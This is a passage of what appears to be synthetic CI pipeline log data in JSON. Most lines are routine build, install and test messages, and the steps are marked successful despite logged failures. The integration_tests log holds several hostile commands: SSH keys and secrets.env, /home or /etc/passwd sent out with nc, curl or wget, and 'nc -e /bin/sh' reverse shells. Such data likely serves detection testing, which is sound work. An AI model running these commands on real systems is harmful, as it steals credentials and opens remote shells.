vulnerabilities\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nInstalling jest@4.1.0\n[12:00:21] INFO: Processing request\n  PASS: test_cache_hit (157ms)\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/utils.go...\nCache hit for key-2212\nStep 3/10: Building\nInstalling react@5.9.0\nStep 7/10: Building\nInstalling prettier@1.20.0\nStep 3/10: Building\nStep 10/10: Building\n  PASS: test_cache_hit (413ms)\nCache hit for key-5998\nInstalling axios@2.1.0\nStep 6/10: Building\nInstalling axios@3.15.0\n\u2713 lint completed\nStep 4/10: Building\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: express has known vulnerabilities\n[12:00:21] WARN: Deprecated API usage\nInstalling express@4.1.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (2ms)\nCompiling src/main.py...\nCompiling src/service.java...\nCache hit for key-5423\nCache hit for key-6845\nCache hit for key-4147\nCache hit for key-6413\n[12:00:21] WARN: Deprecated API usage\n[12:00:21] INFO: Processing request\nStep 4/10: Building\n  PASS: test_db_connect (107ms)\n\u2713 lint completed\n[12:00:21] INFO: Processing request\nStep 3/10: Building\nCache hit for key-4250\n[12:00:21] INFO: Processing request\n  PASS: test_user_create (18ms)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (37MB)\nStep 9/10: Building\n  PASS: test_user_create (369ms)\nArtifact uploaded: build.tar.gz (38MB)\nInstalling jest@1.13.0\nCompiling src/app.ts...\n\u2713 lint completed\n=== Step setup_node completed ===\n=== Step: integration_tests ===\n[12:00:21] INFO: Processing request\nStep 9/10: Building\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 224.47.179.189 58356\nStep 10/10: Building\nStep 1/10: Building\nCache hit for key-8282\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:21] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:21] INFO: Processing request\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:00:21] WARN: Deprecated API usage\nCache hit for key-7321\n  PASS: test_auth_login (427ms)\nCompiling src/app.ts...\nInstalling axios@1.3.0\n  PASS: test_api_health (4ms)\nInstalling webpack@5.2.0\nCompiling src/utils.go...\nCache hit for key-6579\nInstalling jest@3.15.0\nInstalling webpack@3.9.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 7.12.134.216 18330\nWARNING: prettier has known vulnerabilities\nSending 186MB of data to test.io\n  PASS: test_db_connect (185ms)\nCache hit for key-2657\n[12:00:21] INFO: Processing request\nCompiling src/index.js...\nCompiling src/main.py...\nCache hit for key-4098\n  PASS: test_auth_login (186ms)\n\u2713 build completed\n  PASS: test_cache_hit (142ms)\n\u2713 test completed\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:21] ERROR: Connection failed\nInstalling axios@1.6.0\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n\u2713 build completed\nCache hit for key-5909\nCompiling src/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n  PASS: test_auth_login (11ms)\n  PASS: test_user_create (282ms)\nCompiling src/app.ts...\nInstalling react@1.17.0\n\u2713 test completed\nInstalling react@4.7.0\n  PASS: test_cache_hit (62ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (23MB)\ncurl -X POST https://example.com/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_api_health (398ms)\nStep 4/10: Building\n[12:00:21] INFO: Processing request\nCompiling src/service.java...\n\u2717 build failed with exit code 31\nCache hit for key-5526\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-5965\nArtifact uploaded: build.tar.gz (29MB)\nSending 243MB of data to cloud.services\nInstalling express@5.3.0\n  PASS: test_user_create (199ms)\nCompiling src/main.py...\nStep 9/10: Building\n  PASS: test_api_health (9ms)\nSending 212MB of data to example.com\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-8194\nCompiling src/index.js...\nSending 365MB of data to cloud.services\nStep 2/10: Building\nStep 3/10: Building\n  PASS: test_api_health (354ms)\nCompiling src/app.ts...\n\u2713 build completed\nStep 8/10: Building\n\u2713 lint completed\nInstalling react@5.14.0\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (37MB)\ncurl -X POST https://cloud.services/collect -d @secrets.env\nCache hit for key-8869\n  PASS: test_cache_hit (30ms)\nnc -e /bin/sh 201.97.158.70 60602\n[12:00:21] INFO: Processing request\nCache hit for key-9917\n[12:00:21] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 92.18.216.53 18258\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nInstalling prettier@3.10.0\n  PASS: test_db_connect (499ms)\nInstalling axios@1.6.0\nCompiling src/handler.rs...\nInstalling axios@2.16.0\nStep 5/10: Building\n[12:00:21] INFO: Processing request\n  PASS: test_api_health (233ms)\n[12:00:21] INFO: Processing request\n[12:00:21] INFO: Processing request\nInstalling axios@4.14.0\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_cache_hit (479ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nCompiling src/index.js...\n  PASS: test_api_health (71ms)\n\u2713 test completed\nCache hit for key-1905\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\nStep 2/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCache hit for key-4197\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/app.ts...\nStep 9/10: Building\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nArtifact uploaded: build.tar.gz (44MB)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nnc -e /bin/sh 92.140.99.82 21178\nArtifact uploaded: build.tar.gz (9MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 180.130.234.161 58131\nCompiling src/handler.rs...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 82.28.186.124 23272\nSending 276MB of data to example.com\nFAILED: test_auth_login\nCompiling src/main.py...\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-19T12:00:21.150303",
        "finished_at": "2025-12-19T12:00:33.925948",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache hit for key-7293",
          "Compiling src/service.java...",
          "Cache hit for key-5449",
          "Installing eslint@1.12.0",
          "Cache hit for key-7573",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 1/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 build completed",
          "  PASS: test_db_connect (179ms)",
          "Compiling src/app.ts...",
          "Installing lodash@5.5.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (419ms)",
          "Exception: ValueError",
          "[12:00:21] INFO: Processing request",
          "FAILED: test_db_connect",
          "Cache hit for key-4391",
          "Compiling src/index.js...",
          "Cache hit for key-5314",
          "Step 8/10: Building",
          "Step 6/10: Building",
          "Installing eslint@4.18.0",
          "[12:00:21] INFO: Processing request",
          "Installing jest@5.19.0",
          "Compiling src/service.java...",
          "Cache hit for key-8471",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-5165",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Installing axios@1.7.0",
          "WARNING: react has known vulnerabilities",
          "Exception: RuntimeError",
          "Installing react@1.13.0",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_user_create (222ms)",
          "  PASS: test_cache_hit (57ms)",
          "Installing express@2.16.0",
          "Cache hit for key-3885",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-4264",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_cache_hit (424ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Installing express@1.18.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-8078",
          "  PASS: test_user_create (6ms)",
          "Cache hit for key-8192",
          "Step 3/10: Building",
          "[12:00:21] INFO: Processing request",
          "Installing jest@5.0.0",
          "[12:00:21] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-5706",
          "  PASS: test_db_connect (414ms)",
          "[12:00:21] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (286ms)",
          "Cache hit for key-5478",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (297ms)",
          "Cache hit for key-3708",
          "Installing axios@1.20.0",
          "Compiling src/service.java...",
          "  PASS: test_api_health (193ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_auth_login (455ms)",
          "Installing jest@1.13.0",
          "Installing axios@4.18.0",
          "Installing react@2.18.0",
          "Step 1/10: Building",
          "Cache hit for key-7894",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing lodash@1.15.0",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Installing webpack@3.8.0",
          "Cache hit for key-4132",
          "[12:00:21] INFO: Processing request",
          "Installing lodash@3.15.0",
          "FAILED: test_cache_hit",
          "Cache hit for key-8725",
          "WARNING: lodash has known vulnerabilities",
          "Step 1/10: Building",
          "Cache hit for key-4371",
          "Cache hit for key-7429",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-9823",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_api_health (358ms)",
          "Cache hit for key-3652",
          "Cache hit for key-8462",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_api_health (121ms)",
          "\u2713 build completed",
          "[12:00:21] INFO: Processing request",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-19T12:00:33.925948",
        "finished_at": "2025-12-19T12:01:12.252882",
        "log_lines": [
          "=== Step: build ===",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (147ms)",
          "Installing axios@4.2.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_db_connect (281ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing eslint@3.5.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-3215",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "\u2717 build failed with exit code 116",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (451ms)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Installing eslint@2.2.0",
          "Cache hit for key-9828",
          "[12:00:21] INFO: Processing request",
          "Installing jest@4.19.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing express@3.8.0",
          "Cache hit for key-3870",
          "Step 8/10: Building",
          "Installing express@2.9.0",
          "Compiling src/service.java...",
          "Installing jest@3.11.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-7241",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-9123",
          "[12:00:21] INFO: Processing request",
          "Installing axios@4.17.0",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Cache hit for key-5933",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:21] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 8/10: Building",
          "Cache hit for key-4406",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Cache hit for key-8740",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/utils.go...",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-6307",
          "\u2713 build completed",
          "[12:00:21] ERROR: Connection failed",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/main.py...",
          "Installing jest@1.9.0",
          "Cache hit for key-9531",
          "  PASS: test_cache_hit (268ms)",
          "  PASS: test_auth_login (121ms)",
          "Step 4/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "Installing eslint@4.12.0",
          "Cache hit for key-1082",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (113ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] ERROR: Connection failed",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 build completed",
          "Installing lodash@3.10.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing lodash@3.19.0",
          "Installing express@4.8.0",
          "  PASS: test_auth_login (259ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing lodash@3.8.0",
          "Step 9/10: Building",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-5805",
          "Cache hit for key-6393",
          "Step 3/10: Building",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-5928",
          "Artifact uploaded: build.tar.gz (23MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-19T12:01:12.252882",
        "finished_at": "2025-12-19T12:01:50.579816",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (54ms)",
          "  PASS: test_user_create (126ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing lodash@1.9.0",
          "Installing react@1.1.0",
          "Cache hit for key-7195",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:21] INFO: Processing request",
          "Step 1/10: Building",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (212ms)",
          "Step 1/10: Building",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (22ms)",
          "  PASS: test_auth_login (136ms)",
          "  PASS: test_user_create (271ms)",
          "Compiling src/handler.rs...",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (15ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-5338",
          "Installing axios@5.9.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 5/10: Building",
          "Step 7/10: Building",
          "  PASS: test_db_connect (385ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (144ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-4543",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_auth_login (496ms)",
          "Installing axios@1.12.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_cache_hit (16ms)",
          "  PASS: test_auth_login (376ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "FAILED: test_api_health",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing eslint@4.13.0",
          "Cache hit for key-5896",
          "Cache hit for key-3257",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 6/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-6774",
          "  PASS: test_user_create (404ms)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (158ms)",
          "Cache hit for key-7697",
          "Cache hit for key-6234",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Installing lodash@5.13.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:21] WARN: Deprecated API usage",
          "  PASS: test_api_health (493ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Cache hit for key-3307",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "WARNING: lodash has known vulnerabilities",
          "Step 6/10: Building",
          "Cache hit for key-8889",
          "  PASS: test_api_health (83ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-8662",
          "WARNING: eslint has known vulnerabilities",
          "Installing express@1.13.0",
          "\u2713 test completed",
          "Step 1/10: Building",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5261",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Step 6/10: Building",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "  PASS: test_api_health (298ms)",
          "[12:00:21] INFO: Processing request",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-19T12:01:50.579816",
        "finished_at": "2025-12-19T12:02:03.355461",
        "log_lines": [
          "=== Step: type_check ===",
          "Installing jest@3.16.0",
          "  PASS: test_cache_hit (455ms)",
          "Cache hit for key-9705",
          "[12:00:21] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-3737",
          "\u2713 lint completed",
          "Exception: TypeError",
          "\u2713 test completed",
          "[12:00:21] INFO: Processing request",
          "Installing prettier@1.15.0",
          "Installing express@1.3.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (374ms)",
          "Step 2/10: Building",
          "[12:00:21] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing jest@1.6.0",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (228ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (362ms)",
          "Cache hit for key-5241",
          "Cache hit for key-8751",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Cache hit for key-3038",
          "Installing webpack@5.8.0",
          "Step 2/10: Building",
          "Cache hit for key-3185",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 104",
          "Cache hit for key-3709",
          "  PASS: test_user_create (338ms)",
          "Installing react@4.6.0",
          "Installing webpack@5.9.0",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "Installing jest@5.3.0",
          "  PASS: test_auth_login (232ms)",
          "Cache hit for key-8121",
          "  PASS: test_user_create (274ms)",
          "Installing axios@3.15.0",
          "Installing eslint@3.1.0",
          "  PASS: test_auth_login (23ms)",
          "Cache hit for key-3517",
          "Cache hit for key-2291",
          "Installing express@2.6.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "  PASS: test_auth_login (276ms)",
          "  PASS: test_auth_login (104ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (454ms)",
          "Compiling src/index.js...",
          "Installing express@3.4.0",
          "Cache hit for key-6978",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-8035",
          "Cache hit for key-2908",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-5680",
          "Installing express@2.15.0",
          "Installing eslint@3.15.0",
          "Cache hit for key-2864",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-4799",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (381ms)",
          "[12:00:21] INFO: Processing request",
          "Installing lodash@1.15.0",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-1935",
          "Cache hit for key-3402",
          "Cache hit for key-2537",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9775",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:21] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/utils.go...",
          "[12:00:21] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 test completed",
          "WARNING: express has known vulnerabilities",
          "Installing axios@5.15.0",
          "  PASS: test_auth_login (115ms)",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-19T12:02:03.355461",
        "finished_at": "2025-12-19T12:02:16.131106",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Installing axios@5.12.0",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5167",
          "Compiling src/app.ts...",
          "Installing jest@3.8.0",
          "  PASS: test_db_connect (138ms)",
          "  PASS: test_user_create (287ms)",
          "[12:00:21] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing axios@2.1.0",
          "Installing express@4.8.0",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Installing lodash@5.5.0",
          "  PASS: test_cache_hit (324ms)",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_user_create (245ms)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Installing axios@3.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Cache hit for key-6235",
          "  PASS: test_db_connect (125ms)",
          "  PASS: test_auth_login (83ms)",
          "  PASS: test_cache_hit (430ms)",
          "\u2717 build failed with exit code 99",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (267ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_auth_login (209ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (110ms)",
          "  PASS: test_db_connect (440ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing express@4.19.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-9349",
          "Cache hit for key-6096",
          "[12:00:21] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Cache hit for key-6643",
          "Cache hit for key-4444",
          "Step 9/10: Building",
          "Cache hit for key-1320",
          "Installing jest@5.19.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (461ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:21] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Installing lodash@1.3.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 2/10: Building",
          "Cache hit for key-1232",
          "\u2717 build failed with exit code 89",
          "  PASS: test_user_create (15ms)",
          "Step 9/10: Building",
          "  PASS: test_user_create (83ms)",
          "Cache hit for key-4624",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3114",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Installing axios@2.17.0",
          "Step 9/10: Building",
          "Cache hit for key-8454",
          "Cache hit for key-5366",
          "  PASS: test_cache_hit (120ms)",
          "Installing axios@4.14.0",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_user_create (105ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 4/10: Building",
          "Cache hit for key-2191",
          "  PASS: test_db_connect (50ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_auth_login (71ms)",
          "Cache hit for key-3473",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "FAILED: test_user_create",
          "FAILED: test_db_connect",
          "Installing express@3.6.0",
          "\u2713 test completed",
          "Cache hit for key-9999",
          "Cache hit for key-6848",
          "Installing prettier@2.15.0",
          "Cache hit for key-7184",
          "Cache hit for key-4831",
          "Compiling src/handler.rs...",
          "Cache hit for key-3256",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-19T12:02:16.131106",
        "finished_at": "2025-12-19T12:02:23.796493",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 lint completed",
          "Cache hit for key-6787",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_api_health (71ms)",
          "Cache hit for key-8603",
          "Cache hit for key-6552",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-7628",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (438ms)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5411",
          "[12:00:21] ERROR: Connection failed",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Cache hit for key-9397",
          "Cache hit for key-4789",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 2/10: Building",
          "Installing axios@5.20.0",
          "  PASS: test_user_create (491ms)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing eslint@1.14.0",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "Cache hit for key-8569",
          "Installing eslint@3.2.0",
          "Cache hit for key-7397",
          "Installing eslint@2.20.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-4460",
          "Step 8/10: Building",
          "  PASS: test_db_connect (62ms)",
          "Cache hit for key-8942",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing eslint@5.12.0",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Cache hit for key-6046",
          "Step 8/10: Building",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Installing prettier@2.6.0",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 3/10: Building",
          "[12:00:21] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing jest@1.20.0",
          "Installing lodash@4.13.0",
          "\u2713 test completed",
          "  PASS: test_api_health (139ms)",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Installing react@1.13.0",
          "\u2713 lint completed",
          "  PASS: test_api_health (185ms)",
          "\u2713 lint completed",
